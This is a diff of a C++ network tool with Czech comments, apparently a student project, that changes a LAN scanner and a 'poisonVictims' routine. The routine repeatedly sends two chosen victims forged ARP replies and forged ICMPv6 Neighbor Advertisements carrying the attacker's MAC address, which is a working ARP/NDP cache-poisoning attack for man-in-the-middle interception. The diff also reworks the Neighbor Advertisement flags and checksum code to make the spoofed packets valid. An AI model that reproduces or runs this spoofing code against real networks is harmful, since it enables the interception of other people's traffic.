@@ -105,7 +105,7 @@ pcap_t* openInterface(char* interface, const char* secondPar, int timeout)
 		return NULL;
 	}
 
-	cerr<<"Func: openInterface exit(succes)"<<endl;
+//	cerr<<"Func: openInterface exit(succes)"<<endl;
 	
 	// Otevření souboru
 //	outputFile.open(interface,ios::out | ios::trunc);
@@ -147,32 +147,30 @@ void getInterfaceInfo(INTERFACE_INFO* intInfo, char * interface)
 	// Získání masky a adresy sítě (v4)
 	if(pcap_lookupnet(interface, &senderIP, &netmask, errBuf) < 0)
 	{
-		cerr<<"Nenalezena IP..."<<endl;
-		cerr<< "pcap_lookupnet failed: " << errBuf << endl;
-		exit(EXIT_FAILURE);
+		cerr<<"Interface nemá přiřazenou IPv4 adresu."<<endl;
+//		cerr<< "pcap_lookupnet failed: " << errBuf << endl;
+//		exit(EXIT_FAILURE);
+		intInfo->hosts = 0;
 	}
-	
-	src_ip.s_addr = senderIP;
-	src_netmask.s_addr = netmask;
-	// Nakopírování masky a adresy sítě
-	inet_pton(AF_INET, inet_ntoa(src_ip),&intInfo->networkAddress);
-	inet_pton(AF_INET, inet_ntoa(src_netmask),&intInfo->networkMask);
-	
-	// Získání počtu hostů
-	// ##########################################################
-	unsigned long network,hostmask,broadcast;
-	network = ntohl(src_ip.s_addr) & ntohl(src_netmask.s_addr);		// Síť
+	else
+	{
+		src_ip.s_addr = senderIP;
+		src_netmask.s_addr = netmask;
+		// Nakopírování masky a adresy sítě
+		inet_pton(AF_INET, inet_ntoa(src_ip),&intInfo->networkAddress);
+		inet_pton(AF_INET, inet_ntoa(src_netmask),&intInfo->networkMask);
 
-	hostmask = ~ntohl(src_netmask.s_addr);		// Maska
-	broadcast = network | hostmask;				// Broadcast
-	
-	intInfo->hosts = broadcast-network-1;		// Počet stanic
-	// ##########################################################
-	
-//	printf("Broadcast    %s\n",my_ntoa(broadcast));
-//	printf("Hosts        %s\n",my_ntoa(network+1));
-//	printf("   to        %s\n",my_ntoa(broadcast-1));
-//	printf("Host count   %d\n",broadcast-network-1);
+		// Získání počtu hostů
+		// ##########################################################
+		unsigned long network,hostmask,broadcast;
+		network = ntohl(src_ip.s_addr) & ntohl(src_netmask.s_addr);		// Síť
+
+		hostmask = ~ntohl(src_netmask.s_addr);		// Maska
+		broadcast = network | hostmask;				// Broadcast
+
+		intInfo->hosts = broadcast-network-1;		// Počet stanic
+		// ##########################################################		
+	}
 	
 	// IPv4
 	ifr.ifr_addr.sa_family = AF_INET;
@@ -330,12 +328,16 @@ void scanNetwork(INTERFACE_INFO* intInfo,pcap_t* descriptor)
 		// Zasílání skenovacích paketů
 		usleep(1000000);
 		scanIPv4(intInfo);
-		cerr<<"Scan IPv4 rozeslán."<<endl;
+		cerr<<"Scan IPv4 rozeslán...Odeslán"<<endl;
 		scanIPv6(intInfo,false);
 		scanIPv6(intInfo,true);
-		cerr<<"Scan IPv6 rozselán."<<endl;
+		cerr<<"Scan IPv6 rozselán...Odeslán"<<endl;
 //		ARPSniffer(descriptor, (pcap_handler)parsePacket);
-		usleep(119000000);
+		cerr<<"Čekám na odpovědi..."<<endl;
+		usleep(5000000);
+		cerr<<"Ukončuji sken..."<<endl;
+//		pcap_close(descriptor);
+//		usleep(119000000);
 //		cerr<<"ukončí"<<endl;
 //		pcap_close(descriptor);
 		exit(EXIT_SUCCESS);
@@ -378,9 +380,6 @@ void scanIPv4(INTERFACE_INFO* intInfo)
 	dst_address.sin_port = htons(520);
 	dst_address.sin_family = AF_INET;
 
-	printIP(intInfo->interfaceAdd);
-	printIP(intInfo->networkAddress);
-	
 	inet_pton(AF_INET,createAddress(intInfo->interfaceAdd).c_str(),&src_address.sin_addr);
 	inet_pton(AF_INET,createAddress(intInfo->networkAddress).c_str(),&dst_address.sin_addr);
 	
@@ -392,8 +391,7 @@ void scanIPv4(INTERFACE_INFO* intInfo)
 		exit(EXIT_FAILURE);
 	}
 
-	usleep(1000000);
-	cerr<<intInfo->hosts<<endl;
+//	usleep(1000000);
 	int i;
 	for(i = 1; i <= intInfo->hosts; i++)
 	{
@@ -617,9 +615,9 @@ void packetSniffer(pcap_t* descriptor, pcap_handler func)
 	outputFile<<"</devices>\n";
 	outputFile.close();
 	
-	cerr<<"Func: capturePacket exit(succes)"<<endl;
-	cerr<<"Celkem ARP paketů: "<<l<<endl;
-	cerr<<"Celkem ICMP paketů: "<<h<<endl;
+//	cerr<<"Func: capturePacket exit(succes)"<<endl;
+	cerr<<"Celkem přijato "<<l<<" ARP paketů"<<endl;
+	cerr<<"Celkem přijato "<<h<<" ICMP paketů"<<endl;
 }
 
 
@@ -729,15 +727,9 @@ void poisonVictims(INTERFACE_INFO* intInfo, int time, char* mac1, char* mac2, ch
 			
 	// Konverze char* na u_char pro MAC adresy
 	u_char victim1tmp[ETH_ADDR_LEN];
-	createMacAdress(victim1tmp,mac1);
+	createMacAdressFromXML(victim1tmp,(const xmlChar*)mac1);
 	u_char victim2tmp[ETH_ADDR_LEN];
-	createMacAdress(victim2tmp,mac2);
-	
-	if(!arp){
-//		sendPacketNDP(victim1tmp,ip1,mac2,ip2,sockfd, device, ND_NEIGHBOR_SOLICIT);	// Navázání spojení pro otrávení
-//		sendPacketNDP(victim2tmp,ip2,mac1,ip1,sockfd, device ,ND_NEIGHBOR_SOLICIT);	// Navázání spojení pro otrávení	
-	}
-
+	createMacAdressFromXML(victim2tmp,(const xmlChar*)mac2);
 	
 	close(sockfd);
 	
@@ -751,17 +743,13 @@ void poisonVictims(INTERFACE_INFO* intInfo, int time, char* mac1, char* mac2, ch
 			
 		if(arp){
 			// Zasílání ARP paketů oběma obětem
-			sendPacketARP(intInfo->interfaceMac,ip1,mac2,ip2,sockfd, device,false);
-			cerr<<"Odeslán první ARP"<<endl;
-			sendPacketARP(intInfo->interfaceMac,ip2,mac1,ip1,sockfd, device,false);			
-			cerr<<"Odeslán druhý ARP"<<endl;
+			sendPacketARP(intInfo->interfaceMac,ip1,mac2,ip2,sockfd, device,true);
+			sendPacketARP(intInfo->interfaceMac,ip2,mac1,ip1,sockfd, device,true);			
 		}
 		else{
 			// Zasílání NDP packetů
 			sendPacketNDP(intInfo->interfaceMac,ip1,mac2,ip2,sockfd, device, ND_NEIGHBOR_ADVERT);	// Podvržení MAC adress
-			cerr<<"Odeslán první NDP"<<endl;
 			sendPacketNDP(intInfo->interfaceMac,ip2,mac1,ip1,sockfd, device ,ND_NEIGHBOR_ADVERT);	// Podvržení MAC adres	
-			cerr<<"Odeslán druhý NDP"<<endl;
 		}
 		close(sockfd);
 		usleep(time*1000000);
@@ -848,10 +836,9 @@ void sendPacketARP(u_char* srcMac,
 	ethFrame = allocate_ustrmem (IP_MAXPACKET);
 		
 	// Vytvoření MAC adresy ze stringu 
-	createMacAdress(dst_mac,dstMac);
+	createMacAdressFromXML(dst_mac,(const xmlChar*)dstMac);
 
 	 // ARP header
-	createMacAdress(arphdr.tha,dstMac);
 	arphdr.htype = htons (1);
 	arphdr.ptype = htons (ETH_P_IP);
 	arphdr.hlen = ETH_ADDR_LEN;
@@ -863,10 +850,12 @@ void sendPacketARP(u_char* srcMac,
 	{
 		arphdr.oper = htons (ARP_REQUEST);
 		inet_pton(AF_INET, srcIp,&arphdr.spa);
-		inet_pton(AF_INET, srcIp,&arphdr.tpa);		
+		inet_pton(AF_INET, srcIp,&arphdr.tpa);
+		createMacAdressFromXML(arphdr.tha,(const xmlChar*)"0000.0000.0000");		
 	}
 	else
 	{
+		createMacAdressFromXML(arphdr.tha,(const xmlChar*)dstMac);
 		arphdr.oper = htons (ARP_REPLY);
 		// Nakopírování ip adres
 		inet_pton(AF_INET, srcIp,&arphdr.spa);
@@ -923,7 +912,7 @@ void sendPacketNDP(u_char* interfaceMac,
 	send_ether_frame = allocate_ustrmem (IP_MAXPACKET);
 	
 	// Vyvoření MAC adresy oběti
-	createMacAdress(dst_mac,dstMac);
+	createMacAdressFromXML(dst_mac,(const xmlChar*)dstMac);
 
 	// IPv6 header
 	send_iphdr.ip6_flow = htonl ((6 << 28) | (0 << 20) | 0);
@@ -947,7 +936,7 @@ void sendPacketNDP(u_char* interfaceMac,
 	// MAC adresa
 	if(PACKET_TYPE == ND_NEIGHBOR_ADVERT){
 		icmpv6_opt.type = 0x02;
-		icmpv6_opt.flags[0] = 0x70;
+		icmpv6_opt.flags[0] = 0x60;
 	}
 	else{
 		icmpv6_opt.type = 0x01;
@@ -963,7 +952,7 @@ void sendPacketNDP(u_char* interfaceMac,
 		
 	// ICMP header checksum (16 bits): set to 0 when calculating checksum
 	send_icmphdr.icmp6_cksum = 0;
-	send_icmphdr.icmp6_cksum = icmp6_checksum2 (send_iphdr, send_icmphdr, &icmpv6_opt, ICMP_NA_OPT_LEN);	
+	send_icmphdr.icmp6_cksum = na_checksum (send_iphdr, &icmpv6_opt);	
 	
 	// Velikost packetu - velikosti jednotlivých částí
 	frame_length = ETH_HDRLEN + IP6_HDRLEN + ICMP_NA_LEN + ICMP_NA_OPT_LEN;
@@ -998,6 +987,7 @@ void sendPacketNDP(u_char* interfaceMac,
 
 //#################################################################################################################################
 // Následující funkce jsou převzaty z veřejného zdroje - http://www.pdbuchan.com/rawsock/rawsock.html
+// Autor webu: P. David Buchan pdbuchan@yahoo.com
 
 /**
  * Funkce pro převod IP adresy z long na IPv4.
@@ -1016,8 +1006,7 @@ char * myNtoa(unsigned long ip) {
  * @param len - délka
  * @return - spočítaný checksum
  */
-// Computing the internet checksum (RFC 1071).
-// Note that the internet checksum does not preclude collisions.
+// Soubor: na.c
 uint16_t checksum (uint16_t *addr, int len)
 {
 	int count = len;
@@ -1056,6 +1045,7 @@ uint16_t checksum (uint16_t *addr, int len)
  * @param payloadlen
  * @return - checksum
  */
+// Soubor: ping_II.c
 uint16_t icmp6_checksum (struct ip6_hdr iphdr, struct icmp6_hdr icmp6hdr, uint8_t *payload, int payloadlen)
 {
 	char buf[IP_MAXPACKET];
@@ -1137,85 +1127,60 @@ uint16_t icmp6_checksum (struct ip6_hdr iphdr, struct icmp6_hdr icmp6hdr, uint8_
 	return checksum ((uint16_t *) buf, chksumlen);
 }
 
-uint16_t icmp6_checksum2 (struct ip6_hdr iphdr, struct icmp6_hdr icmp6hdr, ICMPV6_OPT *payload, int payloadlen)
+/**
+ * Funkce pro výpočet checksumu u paketu ICMPv6
+ * @param iphdr - ip hlavička
+ * @param options - MAC adresa a typ 
+ * @return - checksum
+ */
+// Soubor: na.c
+uint16_t na_checksum (struct ip6_hdr iphdr, ICMPV6_OPT *optionsHdr)
 {
-	char buf[IP_MAXPACKET];
-	char *ptr;
-	int chksumlen = 0;
-	int i;
+	int NA_HDRLEN = sizeof (struct nd_neighbor_advert);  // Length of NA message header
+	int optlen = 8; // Option Type (1 byte) + Length (1 byte) + Length of MAC address (6 bytes)
 
-	ptr = &buf[0];  // ptr points to beginning of buffer buf
+	int psdhdrlen;
+	struct nd_neighbor_advert *na;
+	uint8_t *outpack, *options, *psdhdr;
 
-	// Copy source IP address into buf (128 bits)
-	memcpy (ptr, &iphdr.ip6_src.s6_addr, sizeof (iphdr.ip6_src.s6_addr));
-	ptr += sizeof (iphdr.ip6_src);
-	chksumlen += sizeof (iphdr.ip6_src);
+	// Allocate memory for various arrays.
+	outpack = allocate_ustrmem (IP_MAXPACKET);
+	options = allocate_ustrmem (optlen);
+	psdhdr = allocate_ustrmem (IP_MAXPACKET);
 
-	// Copy destination IP address into buf (128 bits)
-	memcpy (ptr, &iphdr.ip6_dst.s6_addr, sizeof (iphdr.ip6_dst.s6_addr));
-	ptr += sizeof (iphdr.ip6_dst.s6_addr);
-	chksumlen += sizeof (iphdr.ip6_dst.s6_addr);
+	memcpy (psdhdr, &iphdr.ip6_dst, 16 * sizeof (uint8_t));  // Copy to checksum pseudo-header
+	memcpy (psdhdr + 16, &iphdr.ip6_src, 16 * sizeof (uint8_t));  // Copy to checksum pseudo-header
 
-	// Copy Upper Layer Packet length into buf (32 bits).
-	// Should not be greater than 65535 (i.e., 2 bytes).
-	*ptr = 0; ptr++;
-	*ptr = 0; ptr++;
-	*ptr = (ICMP_NA_LEN + payloadlen) / 256;
-	ptr++;
-	*ptr = (ICMP_NA_LEN + payloadlen) % 256;
-	ptr++;
-	chksumlen += 4;
+	options[0] = 2;           // Option Type - "target link layer address" (Section 4.6 of RFC 4861)
+	options[1] = optlen / 8;  // Option Length - units of 8 octets (RFC 4861)
+	memcpy (options+2, optionsHdr->mac, 6 * sizeof (uint8_t));  // Copy to checksum pseudo-header
+	
+	// Define first part of buffer outpack to be a neighbor advertisement struct.
+	na = (struct nd_neighbor_advert *) outpack;
+	memset (na, 0, sizeof (*na));
+	// Populate icmp6_hdr portion of neighbor advertisement struct.
+	na->nd_na_hdr.icmp6_type = ND_NEIGHBOR_ADVERT;  // 136 (RFC 4861)
+	na->nd_na_hdr.icmp6_code = 0;              // zero for neighbor advertisement (RFC 4861)
+	na->nd_na_hdr.icmp6_cksum = htons(0);      // zero when calculating checksum
+	na->nd_na_flags_reserved = htonl((1 << 30) + (1 << 29));
+//	inet_pton();
+	na->nd_na_target = iphdr.ip6_src;          // Target address (as type in6_addr)
+	// Append options to end of neighbor advertisement struct.
+	memcpy (outpack + NA_HDRLEN, options, optlen * sizeof (uint8_t));
 
-	// Copy zero field to buf (24 bits)
-	*ptr = 0; ptr++;
-	*ptr = 0; ptr++;
-	*ptr = 0; ptr++;
-	chksumlen += 3;
+	psdhdrlen = 16 + 16 + 4 + 3 + 1 + NA_HDRLEN + optlen;
 
-	// Copy next header field to buf (8 bits)
-	memcpy (ptr, &iphdr.ip6_nxt, sizeof (iphdr.ip6_nxt));
-	ptr += sizeof (iphdr.ip6_nxt);
-	chksumlen += sizeof (iphdr.ip6_nxt);
-
-	// Copy ICMPv6 type to buf (8 bits)
-	memcpy (ptr, &icmp6hdr.icmp6_type, sizeof (icmp6hdr.icmp6_type));
-	ptr += sizeof (icmp6hdr.icmp6_type);
-	chksumlen += sizeof (icmp6hdr.icmp6_type);
-
-	// Copy ICMPv6 code to buf (8 bits)
-	memcpy (ptr, &icmp6hdr.icmp6_code, sizeof (icmp6hdr.icmp6_code));
-	ptr += sizeof (icmp6hdr.icmp6_code);
-	chksumlen += sizeof (icmp6hdr.icmp6_code);
-
-	// Copy ICMPv6 ID to buf (16 bits)
-	memcpy (ptr, &icmp6hdr.icmp6_id, sizeof (icmp6hdr.icmp6_id));
-	ptr += sizeof (icmp6hdr.icmp6_id);
-	chksumlen += sizeof (icmp6hdr.icmp6_id);
-
-	// Copy ICMPv6 sequence number to buff (16 bits)
-	memcpy (ptr, &icmp6hdr.icmp6_seq, sizeof (icmp6hdr.icmp6_seq));
-	ptr += sizeof (icmp6hdr.icmp6_seq);
-	chksumlen += sizeof (icmp6hdr.icmp6_seq);
-
-	// Copy ICMPv6 checksum to buf (16 bits)
-	// Zero, since we don't know it yet.
-	*ptr = 0; ptr++;
-	*ptr = 0; ptr++;
-	chksumlen += 2;
-
-	// Copy ICMPv6 payload to buf
-	memcpy (ptr, payload, payloadlen * sizeof (uint8_t));
-	ptr += payloadlen;
-	chksumlen += payloadlen;
-
-	// Pad to the next 16-bit boundary
-	for (i=0; i<payloadlen%2; i++, ptr++) {
-		*ptr = 0;
-		ptr += 1;
-		chksumlen += 1;
-	}
-
-	return checksum ((uint16_t *) buf, chksumlen);
+	psdhdr[32] = 0;  // Length should not be greater than 65535 (i.e., 2 bytes)
+	psdhdr[33] = 0;  // Length should not be greater than 65535 (i.e., 2 bytes)
+	psdhdr[34] = (NA_HDRLEN + optlen)  / 256;  // Upper layer packet length
+	psdhdr[35] = (NA_HDRLEN + optlen)  % 256;  // Upper layer packet length
+	psdhdr[36] = 0;  // Must be zero
+	psdhdr[37] = 0;  // Must be zero
+	psdhdr[38] = 0;  // Must be zero
+	psdhdr[39] = IPPROTO_ICMPV6;
+	memcpy (psdhdr + 40, outpack, (NA_HDRLEN + optlen) * sizeof (uint8_t));
+	
+	return checksum ((uint16_t *) psdhdr, psdhdrlen);
 }
 
 /**
@@ -1223,7 +1188,7 @@ uint16_t icmp6_checksum2 (struct ip6_hdr iphdr, struct icmp6_hdr icmp6hdr, ICMPV
  * @param len - velikost proměnné
  * @return - ukazatel do paměti
  */
-// Allocate memory for an array of unsigned chars.
+// Soubor: na.c
 uint8_t * allocate_ustrmem (int len)
 {
 	void *tmp;
@@ -1242,6 +1207,4 @@ uint8_t * allocate_ustrmem (int len)
 		exit (EXIT_FAILURE);
 	}
 }
-
-
 // ###########################################################################################################
